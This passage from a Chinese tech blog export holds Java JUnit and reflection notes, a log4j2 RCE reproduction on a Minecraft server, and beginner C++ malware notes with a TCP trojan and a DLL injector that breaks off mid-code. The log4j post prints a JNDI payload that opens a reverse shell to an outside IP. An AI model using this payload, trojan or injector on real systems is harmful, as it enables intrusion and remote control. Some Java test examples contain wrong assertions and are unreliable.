testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); //断言assert Assert.assertEquals(3, result); &#125;&#125; 同理可以得到sub的测试函数 1234567//测试sub方法@Testpublic void testSub()&#123; Calculator c = new Calculator(); int result = c.sub(2,1); Assert.assertEquals(3,result);&#125; 注解补充 @Before 初始化方法 用于资源的申请，所有测试方法执行之前都会先执行该方法 在测试方法之前被自动执行 @After 释放资源 在所有测试方法执行完后都会自动执行该方法 测试方法执行之后自动执行 12345678910111213//初始化方法//用于资源的申请，所有测试方法执行之前都会先执行该方法@Beforepublic void init()&#123; System.out.println(&quot;init...&quot;);&#125;//释放资源//在所有测试方法执行完后都会自动执行该方法@Afterpublic void close()&#123; System.out.println(&quot;closed&quot;);&#125; 反射 框架设计的灵魂 框架：半成品软件。可以在框架基础上继续开发，简化编码 反射：将类的各个组成部分封装为其他对象（反射机制） 好处： 在程序运行中操作这些对象 可以解耦，提高程序可拓展性 Java代码运行阶段 获取Class对象方式 Source： 对用于配置文件，将类名定义在配置文件中。读取文件，加载类 Class.forName(“全类名”)：将字节码文件加载进内存返回class对象 Class： 多用于参数传递 依据类名属性class，获取class对象 Runtime 多用于对象的获取字节码的方式 对象.getClass()：方法封装在Object中，被所有对象继承了 同一个字节码文件在同一次程序运行中，只会被加载一次；不论通过那种方式取得，都是同一个对象 每个类对象都不同 使用class对象 功能： 获取： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package LearnJunit.domain;public class Person &#123; private String name; private int age; public String a; protected String b; String c; private String d; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, a=&#x27;&quot; + a + &#x27;\\&#x27;&#x27; + &quot;, b=&#x27;&quot; + b + &#x27;\\&#x27;&#x27; + &quot;, c=&#x27;&quot; + c + &#x27;\\&#x27;&#x27; + &quot;, d=&#x27;&quot; + d + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 获取成员变量们 Field[] getFields()：获取所有public成员变量 1234Field[] fields = personClass.getFields();for (Field field: fields)&#123; System.out.println(field);&#125; Field getField(String name)：获取所有指定名称public成员变量 1Field a = personClass.getField(&quot;a&quot;); Field[] getDeclaredFields() 12345//获取所有成员变量，不考虑修饰Field[] DeclaredFields = personClass.getDeclaredFields();for (Field getDeclaredField: DeclaredFields)&#123; System.out.println(getDeclaredField);&#125; Field getDeclaredField(String name) 反射私有、保护成员变量，要设置忽略访问权限的修饰符安全监测 1234567//1.4获取单个私有System.out.println(&quot;---------------&quot;);Field d = personClass.getDeclaredField(&quot;d&quot;);//1.4.1忽略安全访问d.setAccessible(true);//暴力反射Object value2 = d.get(p);System.out.println(value2); 获取构造方法们 Constructor&lt;?&gt;[] getConstructors() 12Constructor constructor = personClass.getConstructor(String.class, int.class);System.out.println(constructor); Constructor&lt;T&gt; getConstructor(String name) Constructor&lt;?&gt;[] getDeclaredConstructors() Constructor&lt;T&gt; getDeclaredConstructor(String name) 获取成员方法们 method[] getMethods() 12345//获取所有public修饰方法Method[] funcs = personClass.getMethods();for (Method func:funcs)&#123; System.out.println(func);&#125; 123456789101112131415public java.lang.String LearnJunit.domain.Person.toString()public java.lang.String LearnJunit.domain.Person.getName()public void LearnJunit.domain.Person.setName(java.lang.String)public int LearnJunit.domain.Person.getAge()public void LearnJunit.domain.Person.setAge(int)public void LearnJunit.domain.Person.eat()public void LearnJunit.domain.Person.eat(java.lang.String)public final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll() 因为Person类继承的是Object对象，所以有些隐藏函数，即从Object继承下来的函数 method getMethod(String name) 12345 //获取指定方法名称//名字，参数列表匹配 Method eat = personClass.getMethod(&quot;eat&quot;); Method eat2 = personClass.getMethod(&quot;eat&quot;,String.class); eat2.invoke(p,&quot;fish&quot;); method[] getDeclaredMethods() method getDeclaredMethod(String name) 获取类名 String getName() 操作 Field成员变量 设置值（get） 12345Field a = personClass.getField(&quot;a&quot;);//获取成员变量a的值Person p = new Person();Object value = a.get(p);System.out.println(value); 获取值（set） 12a.set(p,&quot;John&quot;);System.out.println(p); 暴力反射：.setAccessible(true); 对所有反射都有效 搭配getDeaclearedXXX使用 这仅仅是打印名称和比较，不需要设置；但是如果要对对象进行相关操作，必须设置；不设置的话操作受限。 Constructor构造方法 创建对象 T newInstance(Object... initargs) 123//1.2创建对象Object person = constructor.newInstance(&quot;Jonh&quot;,5);System.out.println(person); 如果构造使用空参创造对象，可简化 class对象的 newInstance 123Object o = personClass.newInstance();System.out.println(o);System.out.println(&quot;-------------&quot;); Method成员对象 执行方法 123456//获取指定方法名称Method eat = personClass.getMethod(&quot;eat&quot;);//创建方法对象Person p = new Person();//执行方法eat.invoke(p); 获取方法名称 1System.out.println(func.getName()); 获取类名 123//获取类名String classname = personClass.getName();System.out.println(classname); 反射案例 案例： 需求：一个框架，可以帮我们创建任意类的对象，并且执行任意方法 不能改变该类的任何代码， 创建任意对象执行任意方法 一般方式： 12345678910package LearnJunit.reflect;import LearnJunit.domain.Person;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) &#123; //可以创建任意类对象，可以执行任意方法 Person p = new Person(); p.eat(); &#125;&#125; 这里的框架是提前学好的，不能改变；若要使用student类，则代码会改变 实现 配置文件 反射 步骤 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 src中创建配置文件 12className=LearnJunit.domain.PersonmethodName=eat 在程序中加载读取配置文件 1234567891011//1.加载配置文件//1.1创建配置对象Properties pro = new Properties();//1.2加载配置文件，转换为集合//1.2.1获取class目录下配置文件ClassLoader classLoader = ReflectFramework.class.getClassLoader();//获得当前类路径InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;);//读取路径下的config.propertiespro.load(is);//2.获取配置文件中定义的数据String className = pro.getProperty(&quot;className&quot;);String methodName = pro.getProperty(&quot;methodName&quot;); 使用反射技术来加载类文件进内存，创建对象并执行方法 1234567//3.加载类进内存Class cls = Class.forName(className);//4.创建对象Object obj = cls.newInstance();//5.获取方法对象Method method = cls.getMethod(methodName);method.invoke(obj); 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package LearnJunit.reflect;import LearnJunit.domain.Person;import LearnJunit.domain.Student;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;import java.util.stream.IntStream;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchMethodException &#123; //可以创建任意类对象，可以执行任意方法 //不能改变该类的任何代码， //创建任意对象执行任意方法 //1.加载配置文件 //1.1创建配置对象 Properties pro = new Properties(); //1.2加载配置文件，转换为集合 //1.2.1获取class目录下配置文件 ClassLoader classLoader = ReflectFramework.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;); pro.load(is); //2.获取配置文件中定义的数据 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); //3.加载类进内存 Class cls = Class.forName(className); //4.创建对象 Object obj = cls.newInstance(); //5.获取方法对象 Method method = cls.getMethod(methodName); method.invoke(obj); &#125;&#125; 这样只需要修改配置文件就可以了","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"【漏洞复现】minecraft 中的 log4j2 rce","slug":"log4j2-minecraft-rce","date":"2021-12-12T04:18:49.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2021/12/12/log4j2-minecraft-rce/","link":"","permalink":"https://joe1sn.eu.org/2021/12/12/log4j2-minecraft-rce/","excerpt":"log4j 还是1day的时候，对minecraft服务器进行漏洞调试","text":"log4j 还是1day的时候，对minecraft服务器进行漏洞调试 环境搭建 在服务器上搭建了mc服务端，这个照着网上的教程做的 这里用的不是官方包，而是这个：https://www.joe1sn.top/server.jar java版本是 123openjdk version &quot;1.8.0_162&quot;OpenJDK Runtime Environment (build 1.8.0_162-8u162-b12-1-b12)OpenJDK 64-Bit Server VM (build 25.162-b12, mixed mode) 特意换的老版本 开始攻击 这里使用了https://github.com/feihong-cs/JNDIExploit这个工具 在本地搭建ngrok代理本地的监听端口 然后生成利用EXP 1$&#123;jndi:ldap://150.158.75.102:1389/Basic/ReverseShell/3.133.207.110/13605&#125; 登陆服务器在聊天框中输入 回车等待后getshell 但是服务器会崩溃 上面的payload崩溃了一个线程，但是其他线程仍然在运行，所以使用kill -9才能关闭","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"【免杀】C++恶意软件入门笔记","slug":"Maleware","date":"2021-03-30T03:01:00.000Z","updated":"2023-06-13T05:13:20.740Z","comments":true,"path":"2021/03/30/Maleware/","link":"","permalink":"https://joe1sn.eu.org/2021/03/30/Maleware/","excerpt":"C++恶意软件入门笔记，高中看的一本书，大二小小实践一下","text":"C++恶意软件入门笔记，高中看的一本书，大二小小实践一下 简单的Windows API 复制自身到Windows目录 1-1.获得程序自生API DWORD GetModuleFileName 1-2.获得windows目录 UINT GetWindowsDirectory 1-3.拷贝文件 BOOL CopyFile 获得系统基本参数 2-1.获得操作系统版本 BOOL GetVersionEx typedef struct _OSVERSIONINFOA &#123; DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion; DWORD dwBuildNumber; DWORD dwPlatformId; CHAR szCSDVersion[128]; // Maintenance string for PSS usage &#125; OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA; &lt;!--code￼0--&gt; TCP//IP连接木马 简单的TCP/IP测试 server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;Winsock2.h&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;//链接dll// 使用该函数来初始化ws2_32.dll//int WSAStartup//释放Dll// int WSACleanuo(void)//创建的套接字// SOCKET socket// (WSAAPI* LPFN_SOCKET)(// _In_ int af, //通讯协议簇// _In_ int type, //要创建的套接字类型// _In_ int protocol //指定程序所用的通讯协议// );//关闭套接字// closesocket//绑定IP和端口// int bind (SOCKET s, socketaddr, int namelen)//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化ws2_32.dll WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); //2.创建socket套接字 // 通讯协议簇 套接字类型 通讯协议 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //socket对象 s sockaddr_in sockaddr; //socket 等待对象sockaddr sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);//点地址 sockaddr.sin_port = htons(1000); //设置端口 //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 //4.监听 listen(s, 1); cout &lt;&lt; &quot;Start Listenning\\n&quot;; //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //5.recv || send char msg[] = &quot;hello from server\\n&quot;; send(clientSock, msg, strlen(msg)+sizeof(char), NULL); cout &lt;&lt; &quot;Sending Message\\n&quot;; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR *) &amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; &quot;This is msg from server\\n&quot;; cout &lt;&lt; &quot; &quot; &lt;&lt; szBuffer; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; SimpleTCPTorjan server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;cstring&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//1.完成功能命令的发送//2.可以查看远程主机的相关信息，以及复制自身到可执行目录//3.打开/关闭光驱//4.交换和恢复鼠标左右键//宏定义帮助菜单#define HELP &quot;help - Show Help Menu\\n&quot; \\ &quot;getsysinfo - Get System Info\\n&quot; \\ &quot;open - Open The CDRom\\n&quot; \\ &quot;close - Close The CSRom\\n&quot; \\ &quot;swap - Swap Mouse Button\\n&quot; \\ &quot;restore - Restore Mouse Button\\n&quot; \\ &quot;exit - Quit Shell\\n&quot;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 listen(s, 1); //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //开始监听 char CMD[MaxBuf]; char recver[MaxBuf]; memset(CMD, 0, MaxBuf); while (1) &#123; cin &gt;&gt; CMD; if (!strcmp(CMD, &quot;help&quot;)) cout &lt;&lt; HELP &lt;&lt; endl; else if (!strcmp(CMD, &quot;getsysinfo&quot;)) &#123; send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); char temp[MaxBuf]; memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); cout &lt;&lt; &quot;recved?\\n&quot;; cout &lt;&lt; temp &lt;&lt;endl; &#125; else send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); memset(CMD, 0, MaxBuf); &#125; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//打开或关闭光驱//VOID SetCdaudio(BOOL bOpen)//&#123;// if (bOpen)// mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);// else// mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);//&#125;VOID MouseSwap(BOOL bSwap)&#123; if (bSwap) SwapMouseButton(TRUE); else SwapMouseButton(FALSE);&#125;//对命令进行解析BOOL Dispatch(SOCKET &amp;sock, char* szCmd)&#123; BOOL bRet = FALSE; if (!strcmp(szCmd, &quot;getsysinfo&quot;)) &#123; char szComputerName[MaxBuf]; char szUserName[MaxBuf]; DWORD buffer1 = MaxBuf; GetComputerNameA(szComputerName, &amp;buffer1); DWORD buffer2 = MaxBuf; GetUserNameA(szUserName, &amp;buffer2); strcat(szUserName, &quot;@&quot;); strcat(szUserName, szComputerName); cout &lt;&lt; szUserName &lt;&lt; endl; send(sock, szUserName, strlen(szUserName) + sizeof(char),NULL); bRet = 1; &#125; //else if (!strcmp(szCmd, &quot;open&quot;)) //&#123; // SetCdaudio(1); // bRet = 1; //&#125; //else if (!strcmp(szCmd, &quot;clsoe&quot;)) //&#123; // SetCdaudio(0); // bRet = 1; //&#125; else if (!strcmp(szCmd, &quot;swap&quot;)) &#123; MouseSwap(1); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;restore&quot;)) &#123; MouseSwap(0); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;exit&quot;)) exit(0); else bRet = 0; return bRet;&#125;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; memset(szBuffer, 0, MaxBuf); while (1) &#123; if (s) &#123; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; szBuffer &lt;&lt; endl; Dispatch(s, szBuffer); memset(szBuffer, 0, MaxBuf); &#125; &#125; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; client回传计算机相关信息有问题 Windows文件操作相关API 注册表相关 1.打开注册表 12345678WINADVAPILSTATUSAPIENTRYRegOpenKeyA ( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _Out_ PHKEY phkResult ); 使用 12HKEY hKey;long lRet = RegOpenKey(keysname, REG_RUN, &amp;hKey); 2.注册表查询 https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya 1234567891011121314151617WINADVAPILSTATUSAPIENTRYRegQueryInfoKeyA( _In_ HKEY hKey, //子键句柄 _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass, //指向缓冲区的指针，该缓冲区接收用户定义的键类。此参数可以为NULL。 _Inout_opt_ LPDWORD lpcchClass, //该变量指定lpClass参数指向的缓冲区的大小 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL。 _Out_opt_ LPDWORD lpcSubKeys, //指向一个变量的指针，该变量接收指定键所包含的子键的数量。此参数可以为NULL _Out_opt_ LPDWORD lpcbMaxSubKeyLen,//指向变量的指针，该变量以最长的名称接收键的子键的大小，以Unicode字符表示，不包括终止的空字符 _Out_opt_ LPDWORD lpcbMaxClassLen,//指向变量的指针，该变量接收以Unicode字符表示的指定子项类的最长字符串的大小 _Out_opt_ LPDWORD lpcValues, //指向变量的指针，该变量接收与键关联的值的数量 _Out_opt_ LPDWORD lpcbMaxValueNameLen,//指向变量的指针，该变量接收键的最长值名称的大小（以Unicode字符表示） _Out_opt_ LPDWORD lpcbMaxValueLen,//指向一个变量的指针，该变量接收键值中最长的数据分量的大小（以字节为单位） _Out_opt_ LPDWORD lpcbSecurityDescriptor,//指向一个变量的指针，该变量接收密钥的安全描述符的大小 _Out_opt_ PFILETIME lpftLastWriteTime//指向接收最后写入时间的FILETIME结构的指针 。此参数可以为NULL ); 3.注册表写入 1234567891011WINADVAPILSTATUSAPIENTRYRegSetKeyValueA( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ LPCSTR lpValueName, _In_ DWORD dwType, _In_reads_bytes_opt_(cbData) LPCVOID lpData, _In_ DWORD cbData ); 4.注册表值的枚举 12345678910111213WINADVAPILSTATUSAPIENTRYRegEnumKeyExA( _In_ HKEY hKey, _In_ DWORD dwIndex, //查询索引 _Out_writes_to_opt_(*lpcchName,*lpcchName + 1) LPSTR lpName,//子键名称 _Inout_ LPDWORD lpcchName, //如果函数成功，则由lpcName指向的变量将包含存储在缓冲区中的字符数，不包括终止的空字符 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,//该缓冲区接收枚举子项的用户定义类 _Inout_opt_ LPDWORD lpcchClass, //如果函数成功，则lpcClass包含缓冲区中存储的字符数，不包括终止的空字符 _Out_opt_ PFILETIME lpftLastWriteTime//指向FILETIME结构的指针，该结构接收上一次写入枚举子键的时间 ); 5.键值删除 1234567WINADVAPILSTATUSAPIENTRYRegDeleteKeyA ( _In_ HKEY hKey, _In_ LPCSTR lpSubKey ); 文件操作相关 1.打开文件 123456789CreateFileA( _In_ LPCSTR lpFileName, //要打开的文件名字 _In_ DWORD dwDesiredAccess, //访问模式 _In_ DWORD dwShareMode, //文件的共享模式 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性 _In_ DWORD dwCreationDisposition, //创建或打开文件不存在时的操作 _In_ DWORD dwFlagsAndAttributes, //创建或打开文件的标志和属性 _In_opt_ HANDLE hTemplateFile //文件模板); 2.关闭文件 123CloseHandle( _In_ _Post_ptr_invalid_ HANDLE hObject ); 3.删除文件 12345BOOLWINAPIDeleteFileA( _In_ LPCSTR lpFileName ); 4.读函数 1234567891011WINBASEAPI_Must_inspect_result_BOOLWINAPIReadFile( _In_ HANDLE hFile, //文件句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) __out_data_source(FILE) LPVOID lpBuffer, //指向一个缓冲区，把数据读取到里面 _In_ DWORD nNumberOfBytesToRead, //要读取的字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, //返回实际的读取数 _Inout_opt_ LPOVERLAPPED lpOverlapped //一般设置为NULL ); 5.写函数 12345678910WINBASEAPIBOOLWINAPIWriteFile( _In_ HANDLE hFile, _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped ); 6.设置文件指针 123456789WINBASEAPIDWORDWINAPISetFilePointer( _In_ HANDLE hFile, //打开的文件句柄 _In_ LONG lDistanceToMove, //指定要移动的距离 _Inout_opt_ PLONG lpDistanceToMoveHigh, //要移动距离的高32位 _In_ DWORD dwMoveMethod //指定移动位置 ); 7.创建目录 1234567WINBASEAPIBOOLWINAPICreateDirectoryA( _In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes ); 8.移动目录 123456WINBASEAPIBOOLWINAPIRemoveDirectoryA( _In_ LPCSTR lpPathName ); AutoImmunity的MFC初体验 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// AutoRunImmunity.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;AutoRunImmunity.h&quot;#include &quot;AutoRunImmunityDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CAutoRunImmunityAppBEGIN_MESSAGE_MAP(CAutoRunImmunityApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CAutoRunImmunityApp 构造CAutoRunImmunityApp::CAutoRunImmunityApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CAutoRunImmunityApp 对象CAutoRunImmunityApp theApp;// CAutoRunImmunityApp 初始化BOOL CAutoRunImmunityApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CAutoRunImmunityDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; DLL注入 DLL_Helloworld 1234567891011121314151617181920212223242526272829303132333435363738394041424344// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;const int MaxLen = 0x50;//extern &quot;C&quot; __declspec(dllexport) //VOID MsgBox(wchar_t*szMsg)//&#123;// wchar_t szModuleName[MaxLen];// GetModuleFileName(NULL, szModuleName, MaxLen);// MessageBox(NULL,szMsg,szModuleName,MB_OK);//&#125;VOID MsgBox(wchar_t* szMsg)&#123; wchar_t szModuleName[MaxLen]; GetModuleFileName(NULL, szModuleName, MaxLen); MessageBoxW(NULL, szMsg, szModuleName, MB_OK);&#125;BOOL APIENTRY DllMain(HMODULE hModule, //DLL模块句柄 DWORD ul_reason_for_call,//被调用原因 LPVOID lpReserved //保留想，傻逼windows)//入口函数&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; MessageBoxA(NULL, &quot;HI&quot;, &quot;Attached&quot;, MB_OK); break; &#125; case DLL_THREAD_ATTACH: &#123; MsgBox((wchar_t*)&quot;Thread attached&quot;); break; &#125; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; DLL注入 注入器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;string&gt;#include &lt;cstring&gt;const int MaxLen = 0x50;using namespace std;int main()&#123; char DllPath[MaxLen]; DWORD PID; cout &lt;&lt; &quot;Which DLL To Load?\\n&quot;; cin &gt;&gt; DllPath; if (DllPath == NULL) cout &lt;&lt; &quot;This Dll Not exsits\\n&quot;; cout &lt;&lt; DllPath &lt;&lt; endl; //LoadLibraryA((LPCSTR)DllPath); cout &lt;&lt; &quot;Which Program want to hijack?\\n&quot;; cin &gt;&gt; PID; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID); if (hProcess == NULL) &#123; cout &lt;&lt; &quot;This process is missing\\n&quot;; exit(-1); &#125; int DllLen = strlen(DllPath) + sizeof(char); PVOID pDllAddr = VirtualAllocEx( hProcess,NULL,DllLen,MEM_COMMIT,PAGE_READWRITE ); if (pDllAddr == NULL) &#123; CloseHandle(hProcess); cout &lt;&lt; &quot;Handle ERROR\\n&quot;; exit(-1); &#125; DWORD dwWriteNum = 0; cout &lt;&lt; &quot;Writting Mem\\n&quot;; WriteProcessMemory( hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum ); cout &lt;&lt; 